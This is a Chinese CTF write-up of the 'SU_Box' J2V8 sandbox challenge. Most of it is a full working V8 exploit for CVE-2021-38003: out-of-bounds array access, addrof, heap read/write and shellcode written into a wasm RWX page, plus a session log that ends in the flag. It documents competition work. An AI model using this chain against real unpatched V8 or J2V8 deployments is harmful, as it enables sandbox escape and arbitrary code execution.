# SU_Box

## 题目简述
题目提示是 `java, but not java`，附件实际是一个基于 J2V8 的 JavaScript 执行沙箱：程序读取选手输入的 JS，直到单独一行 `EOF`，随后创建 V8 runtime，注册宿主回调 `log()` 并执行脚本。宿主没有暴露 Java 反射、`require` 或 Nashorn 风格对象，因此常规 Java 沙箱逃逸不可行。

真正攻击面在 J2V8 内嵌的 V8 `9.3.345.11`。可利用 CVE-2021-38003 相关 `JSON.stringify` hole 构造数组 OOB，再搭建 `addrof`、V8 heap 读写和 wasm RWX 页写 shellcode，最终从脚本执行器中逃逸。

## 解题过程
一个非常精简的 J2V8 脚本执行器。读取用户输入的 JavaScript，直到遇到单独一行 EOF 为止，然后
创建 V8 运行时，注册一个 log() 回调，最后直接执行脚本。

基本排除常规 Java 沙箱逃逸路线。宿主侧只暴露了一个 log() ，没有 require ，没有 Java 对象
直接暴露给脚本，也没有 Nashorn 风格的反射接口。因此攻击面主要集中在 J2V8 桥接层和底层 V8。
在本地对 log() 回调相关的重入、toString() 、setter、Proxy 等行为测试，能得到一些宿主侧
崩溃和异常状态，但都更接近 DoS，无法构造任意读写。于是寻找 V8 n-day。题目内嵌 V8 为
9.3.345.11 。搜索后相近最适合的公开链是 CVE-2021-38003 ，即 JSON.stringify 相关
的数组越界问题。JSON.stringify 会在异常路径上返回一个可利用的 hole ，后面配合 Map
操作可以把某个数组的 length 篡改成超大值，从而形成 OOB。网上的公开 PoC 不能直接使用, 要
把堆布局重新调整, 最终调试后稳定布局如下：

```javascript
const oob_arr = [1.1, 1.1, 1.1, 1.1];
const helper_arr = [];
const victim_arr = [2.2, 2.2, 2.2, 2.2];
const obj_arr = [{ x: 1 }, { x: 2 }, { x: 3 }, { x: 4 }];

map.set(0x19, 0x100);
map.set(0x111, oob_arr);
helper_arr[1] = 0x100;
```

helper_arr 必须是空数组。该布局下，helper_arr[1] 会别名到 oob_arr.length ，从
而把 oob_arr.length 扩成大值，获得稳定 OOB。随后通过本地探针和 gdb 对照，确认出以下几
个关键槽位：

oob_arr[20] 对应 victim_arr.elements

oob_arr[21] 对应 victim_arr.length

oob_arr[52] 对应 obj_arr.elements

oob_arr[53] 对应 obj_arr.length

有了这些偏移以后，就可以构造 addrof 和任意 V8 heap 读写。首先保存原始布局，后续稳定性依
赖于及时恢复这些字段, 不恢复会挂掉.

```javascript
const ORIG_VICTIM_ELEM = ftoi(oob_arr[20]);
const ORIG_VICTIM_LEN = ftoi(oob_arr[21]);
const ORIG_OBJ_ELEM = ftoi(oob_arr[52]);
const ORIG_OBJ_LEN = ftoi(oob_arr[53]);

function restore_layout() {
oob_arr[20] = itof(ORIG_VICTIM_ELEM);

oob_arr[21] = itof(ORIG_VICTIM_LEN);
oob_arr[52] = itof(ORIG_OBJ_ELEM);
oob_arr[53] = itof(ORIG_OBJ_LEN);
}
```

addrof 的实现方式是把 obj_arr[0] 写成目标对象，再把 obj_arr.elements 临时改成
victim_arr.elements ，从 victim_arr[0] 读出对象地址：

```javascript
function addrof(obj) {
oob_arr[52] = itof(ORIG_VICTIM_ELEM);
oob_arr[53] = itof(ORIG_OBJ_LEN);
obj_arr[0] = obj;
return ftoi(victim_arr[0]);
}
```

读出来的是 tagged pointer，实际使用时减去 1n 。

任意 V8 heap 读写原语如下：

```javascript
function heap_read64(addr) {
oob_arr[20] = itof((addr - 0x10n) | 1n);
const out = ftoi(victim_arr[0]);
oob_arr[20] = itof(ORIG_VICTIM_ELEM);
return out;
}

function heap_write64(addr, val) {
oob_arr[20] = itof((addr - 0x10n) | 1n);
victim_arr[0] = itof(val);
oob_arr[20] = itof(ORIG_VICTIM_ELEM);
}
```

恢复步骤不能省略, 在测试下如果省略会导致利用失败.

有了 addrof 和 heap read/write 之后，构造一个最小 wasm, 借 wasm 实例拿可执行代码
页：

```javascript
const wasm_code = new Uint8Array([
0, 97, 115, 109, 1, 0, 0, 0, 1, 133, 128, 128, 128, 0,
1, 96, 0, 1, 127, 3, 130, 128, 128, 128, 0, 1, 0, 4,

132, 128, 128, 128, 0, 1, 112, 0, 0, 5, 131, 128, 128, 128,
0, 1, 0, 1, 6, 129, 128, 128, 128, 0, 0, 7, 145, 128,
128, 128, 0, 2, 6, 109, 101, 109, 111, 114, 121, 2, 0, 4,
109, 97, 105, 110, 0, 0, 10, 138, 128, 128, 128, 0, 1, 132,
128, 128, 128, 0, 0, 65, 42, 11
]);
const wasm_mod = new WebAssembly.Module(wasm_code);
const wasm_instance = new WebAssembly.Instance(wasm_mod);
const wasm_entry = wasm_instance.exports.main;
```

随后泄露 wasm_instance 地址，并从对象内部找到代码页, 本地调试确认稳定偏移为 inst +
0x80 ：

```javascript
const inst_addr = addrof(wasm_instance) - 1n;
const rwx = heap_read64(inst_addr + 0x80n);
```

此时可以拿到对应的 rwx 页，但页首不是最终要执行的 wasm 函数体。调试发现 wasm_entry()
实际执行位置在 rwx + 0x500 .

wasm 代码页在前几次调用过程中还会经历 materialize/finalize。patch 过早，后续调用路径会把原
始代码重新覆盖。稳定方案是先对 wasm_entry() 做足够次数的 warm-up，再写入代码，写入后
立即恢复数组布局，最后再触发一次执行。

### exp:

```javascript
const conv_ab = new ArrayBuffer(8);
const conv_f64 = new Float64Array(conv_ab);
const conv_u64 = new BigUint64Array(conv_ab);

function ftoi(f) {
conv_f64[0] = f;
return conv_u64[0];
}

function itof(i) {
conv_u64[0] = i;
return conv_f64[0];
}

function trigger() {
let a = [], b = [];
let s = "\"".repeat(0x800000);

a[20000] = s;
for (let i = 0; i < 10; i++)
a[i] = s;
for (let i = 0; i < 10; i++)
b[i] = a;
try {
JSON.stringify(b);
} catch (hole) {
return hole;
}
throw new Error("failed to trigger");
}

const hole = trigger();
const map = new Map();
map.set(1, 1);
map.set(hole, 1);
map.delete(hole);
map.delete(hole);
map.delete(1);

const oob_arr = [1.1, 1.1, 1.1, 1.1];
const helper_arr = [];
const victim_arr = [2.2, 2.2, 2.2, 2.2];
const obj_arr = [{ x: 1 }, { x: 2 }, { x: 3 }, { x: 4 }];

// With helper_arr = [], index 1 aliases oob_arr.length after the corruption.
map.set(0x19, 0x100);
map.set(0x111, oob_arr);
helper_arr[1] = 0x100;

const ORIG_VICTIM_ELEM = ftoi(oob_arr[20]);
const ORIG_VICTIM_LEN = ftoi(oob_arr[21]);
const ORIG_OBJ_ELEM = ftoi(oob_arr[52]);
const ORIG_OBJ_LEN = ftoi(oob_arr[53]);

function restore_layout() {
oob_arr[20] = itof(ORIG_VICTIM_ELEM);
oob_arr[21] = itof(ORIG_VICTIM_LEN);
oob_arr[52] = itof(ORIG_OBJ_ELEM);
oob_arr[53] = itof(ORIG_OBJ_LEN);
}

function addrof(obj) {
oob_arr[52] = itof(ORIG_VICTIM_ELEM);
oob_arr[53] = itof(ORIG_OBJ_LEN);
obj_arr[0] = obj;

return ftoi(victim_arr[0]);
}

function heap_read64(addr) {
oob_arr[20] = itof((addr - 0x10n) | 1n);
const out = ftoi(victim_arr[0]);
oob_arr[20] = itof(ORIG_VICTIM_ELEM);
return out;
}

function heap_write64(addr, val) {
oob_arr[20] = itof((addr - 0x10n) | 1n);
victim_arr[0] = itof(val);
oob_arr[20] = itof(ORIG_VICTIM_ELEM);
}

function writeBytes64(addr, bytes) {
for (let i = 0; i < bytes.length; i += 8) {
let q = 0n;
for (let j = 0; j < 8 && i + j < bytes.length; j++) {
q |= BigInt(bytes[i + j]) << (8n * BigInt(j));
}
heap_write64(addr + BigInt(i), q);
}
}

const wasm_code = new Uint8Array([
0, 97, 115, 109, 1, 0, 0, 0, 1, 133, 128, 128, 128, 0,
1, 96, 0, 1, 127, 3, 130, 128, 128, 128, 0, 1, 0, 4,
132, 128, 128, 128, 0, 1, 112, 0, 0, 5, 131, 128, 128, 128,
0, 1, 0, 1, 6, 129, 128, 128, 128, 0, 0, 7, 145, 128,
128, 128, 0, 2, 6, 109, 101, 109, 111, 114, 121, 2, 0, 4,
109, 97, 105, 110, 0, 0, 10, 138, 128, 128, 128, 0, 1, 132,
128, 128, 128, 0, 0, 65, 42, 11
]);
const wasm_mod = new WebAssembly.Module(wasm_code);
const wasm_instance = new WebAssembly.Instance(wasm_mod);
const wasm_entry = wasm_instance.exports.main;

const inst_addr = addrof(wasm_instance) - 1n;
const rwx = heap_read64(inst_addr + 0x80n);

const shellcode = [
0x48, 0x31, 0xc0, 0x50, 0x48, 0xbb, 0x2f, 0x66, 0x6c, 0x61, 0x67,
0x00, 0x00, 0x00, 0x53, 0x48, 0x89, 0xe7, 0x48, 0x31, 0xf6, 0xb0,
0x02, 0x0f, 0x05, 0x48, 0x89, 0xc7, 0x48, 0x81, 0xec, 0x00, 0x01,
0x00, 0x00, 0x48, 0x89, 0xe6, 0xba, 0x00, 0x01, 0x00, 0x00, 0x48,

0x31, 0xc0, 0x0f, 0x05, 0x48, 0x89, 0xc2, 0xbf, 0x01, 0x00, 0x00,
0x00, 0xb8, 0x01, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xb8, 0x3c, 0x00,
0x00, 0x00, 0x48, 0x31, 0xff, 0x0f, 0x05
];

for (let i = 0; i < 0x1000; i++) {
wasm_entry();
}

writeBytes64(rwx + 0x500n, shellcode);

restore_layout();
wasm_entry();
```

```javascript
❯ nc <target> 10008
____ _ _ ____
/ ___|| | | | __ ) _____ __
\___ \| | | | _ \ / _ \ \/ /
___) | |_| | |_) | (_) > <
|____/ \___/|____/ \___/_/\_\

A simple script sandbox. Enter JavaScript below.
End your input with 'EOF' on a new line.
─────────────────────────────────────────────────
const conv_ab = new ArrayBuffer(8);
const conv_f64 = new Float64Array(conv_ab);
const conv_u64 = new BigUint64Array(conv_ab);

function ftoi(f) {
conv_f64[0] = f;
return conv_u64[0];
}

function itof(i) {
conv_u64[0] = i;
return conv_f64[0];
}

function trigger() {
let a = [], b = [];
let s = "\"".repeat(0x800000);
a[20000] = s;
for (let i = 0; i < 10; i++)
a[i] = s;

for (let i = 0; i < 10; i++)
b[i] = a;
try {
JSON.stringify(b);
} catch (hole) {
return hole;
}
throw new Error("failed to trigger");
}

const hole = trigger();
const map = new Map();
map.set(1, 1);
map.set(hole, 1);
map.delete(hole);
map.delete(hole);
map.delete(1);

const oob_arr = [1.1, 1.1, 1.1, 1.1];
const helper_arr = [];
const victim_arr = [2.2, 2.2, 2.2, 2.2];
const obj_arr = [{ x: 1 }, { x: 2 }, { x: 3 }, { x: 4 }];

// With helper_arr = [], index 1 aliases oob_arr.length after the corruption.
map.set(0x19, 0x100);
map.set(0x111, oob_arr);
helper_arr[1] = 0x100;

const ORIG_VICTIM_ELEM = ftoi(oob_arr[20]);
const ORIG_VICTIM_LEN = ftoi(oob_arr[21]);
const ORIG_OBJ_ELEM = ftoi(oob_arr[52]);
const ORIG_OBJ_LEN = ftoi(oob_arr[53]);

function restore_layout() {
oob_arr[20] = itof(ORIG_VICTIM_ELEM);
oob_arr[21] = itof(ORIG_VICTIM_LEN);
oob_arr[52] = itof(ORIG_OBJ_ELEM);
oob_arr[53] = itof(ORIG_OBJ_LEN);
}

function addrof(obj) {
oob_arr[52] = itof(ORIG_VICTIM_ELEM);
oob_arr[53] = itof(ORIG_OBJ_LEN);
obj_arr[0] = obj;
return ftoi(victim_arr[0]);
}

function heap_read64(addr) {
oob_arr[20] = itof((addr - 0x10n) | 1n);
const out = ftoi(victim_arr[0]);
oob_arr[20] = itof(ORIG_VICTIM_ELEM);
return out;
}

function heap_write64(addr, val) {
oob_arr[20] = itof((addr - 0x10n) | 1n);
victim_arr[0] = itof(val);
oob_arr[20] = itof(ORIG_VICTIM_ELEM);
}

function writeBytes64(addr, bytes) {
for (let i = 0; i < bytes.length; i += 8) {
let q = 0n;
for (let j = 0; j < 8 && i + j < bytes.length; j++) {
q |= BigInt(bytes[i + j]) << (8n * BigInt(j));
}
heap_write64(addr + BigInt(i), q);
}
}

const wasm_code = new Uint8Array([
0, 97, 115, 109, 1, 0, 0, 0, 1, 133, 128, 128, 128, 0,
1, 96, 0, 1, 127, 3, 130, 128, 128, 128, 0, 1, 0, 4,
132, 128, 128, 128, 0, 1, 112, 0, 0, 5, 131, 128, 128, 128,
0, 1, 0, 1, 6, 129, 128, 128, 128, 0, 0, 7, 145, 128,
128, 128, 0, 2, 6, 109, 101, 109, 111, 114, 121, 2, 0, 4,
109, 97, 105, 110, 0, 0, 10, 138, 128, 128, 128, 0, 1, 132,
128, 128, 128, 0, 0, 65, 42, 11
]);
const wasm_mod = new WebAssembly.Module(wasm_code);
const wasm_instance = new WebAssembly.Instance(wasm_mod);
const wasm_entry = wasm_instance.exports.main;

const inst_addr = addrof(wasm_instance) - 1n;
const rwx = heap_read64(inst_addr + 0x80n);

const shellcode = [
0x48, 0x31, 0xc0, 0x50, 0x48, 0xbb, 0x2f, 0x66, 0x6c, 0x61, 0x67,
0x00, 0x00, 0x00, 0x53, 0x48, 0x89, 0xe7, 0x48, 0x31, 0xf6, 0xb0,
0x02, 0x0f, 0x05, 0x48, 0x89, 0xc7, 0x48, 0x81, 0xec, 0x00, 0x01,
0x00, 0x00, 0x48, 0x89, 0xe6, 0xba, 0x00, 0x01, 0x00, 0x00, 0x48,
0x31, 0xc0, 0x0f, 0x05, 0x48, 0x89, 0xc2, 0xbf, 0x01, 0x00, 0x00,
0x00, 0xb8, 0x01, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xb8, 0x3c, 0x00,
0x00, 0x00, 0x48, 0x31, 0xff, 0x0f, 0x05

];

for (let i = 0; i < 0x1000; i++) {
wasm_entry();
}

writeBytes64(rwx + 0x500n, shellcode);

restore_layout();
wasm_entry();
EOF
─────────────────────────────────────────────────
[*] Executing...
SUCTF{y0u_kn@w_v8_p@tch_gap_we1!}
```

## 方法总结
- 核心技巧：V8 n-day 利用链
- 识别信号：Java/J2V8 只给 JS 执行和极少宿主 API，且 V8 版本落在已知漏洞范围。
- 复用要点：先用公开漏洞调堆布局得到 OOB，再构造 addrof/heap read-write，借 wasm rwx 页执行 shellcode。
